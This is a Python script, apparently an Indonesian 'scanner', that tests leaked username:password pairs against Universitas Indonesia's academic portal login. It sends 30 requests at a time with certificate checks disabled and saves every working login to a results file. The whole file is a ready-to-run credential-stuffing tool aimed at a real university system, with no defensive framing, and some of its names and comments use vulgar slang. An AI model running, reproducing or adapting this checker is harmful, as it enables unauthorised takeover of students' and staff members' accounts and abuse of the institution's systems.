import os, time, platform, requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
from time import sleep
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
flag = '\x1b[47;30m'
sukses = []
#bn = f"\r{flag}  {red} UNY SCANNER  \n"

os.system('clear')

#def kontol():
#	print(f'{cyan}============================')
#	print(f'{off}[{flag}{red} AIR SCANNER  |  {off}]')
#	print(f'{cyan}============================')

def upi(i, usr, pwd):
	ses = req.Session()
	url = 'https://academic.ui.ac.id/main/Authentication/Index'
	dat = {'u':usr,  'p':pwd}
	raw = ses.post(url, data=dat, verify=False, timeout=10).text
	res = bs(raw, 'html.parser').title.get_text()
	if res == 'SIAKNG - Universitas Indonesia':
	   print(f"{off}[{red}error{off}]{white} - {red}{usr}{cyan}:{red}{pwd}{off}")
	else:
	   print(f"{off}[{green}aktif{off}]{white} - {green}{usr}{red}:{green}{pwd}{off}")
	   with open('hasil_um.txt', 'a') as save:
	   	save.write(f"{usr}:{pwd}\n")

def progres():
    try:
       # list = input(f" {off}[{white}+{off}]{white}file {white} : ")
        with open('tes') as file:
            lines = file.readlines()
            count = 1
            os.system('clear')
            print(f"{off}[{yellow}+{off}]{white}Total {red}{len(lines)} {white}Akun Terdeteksi \n")
            with ThreadPoolExecutor(max_workers=30) as crot:
                 for line in lines:
                    user = line.strip().split(':')[0]
                    pswd = line.strip().split(':')[1]
                    crot.submit(upi, count, user, pswd)
                 else:
                    if len(sukses) > 0:
                        print(f"{cyan}[{white}✓{cyan}]{green} {len(sukses)}{white} data login tersimpan ")
                    else:
                        pass

    except FileNotFoundError:
        print(f" {cyan}[{white}!{cyan}]{red} File tidak ditemukan :( ")
        sleep(1)
        main()
    except KeyboardInterrupt:
        exit()

def main():
	os.system('clear')
#	kontol()
	progres()
	
if __name__ == '__main__':
    main()
